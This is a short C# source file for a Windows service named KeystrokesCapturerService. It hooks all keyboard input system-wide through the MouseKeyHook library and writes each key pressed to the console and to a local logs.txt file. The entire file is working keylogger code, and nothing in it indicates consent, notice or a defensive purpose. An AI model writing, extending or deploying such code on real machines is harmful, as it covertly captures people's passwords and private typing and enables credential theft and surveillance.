using Gma.System.MouseKeyHook;
using RegisterItAll.Services.Base;
using System;
using System.IO;
using System.Windows.Forms;

namespace RegisterItAll.Services
{
    public partial class KeystrokesCapturerService : ExecutableAsConsoleApplicationService
    {
        protected override void OnStart(string[] args)
        {
            IKeyboardMouseEvents hook = Hook.GlobalEvents();

            hook.KeyPress += OnKeyPressed;

            Application.Run();
        }

        private static void OnKeyPressed(object sender, KeyPressEventArgs args)
        {
            Console.WriteLine(args.KeyChar.ToString());

            File.AppendAllText("logs.txt", args.KeyChar.ToString());
        }
    }
}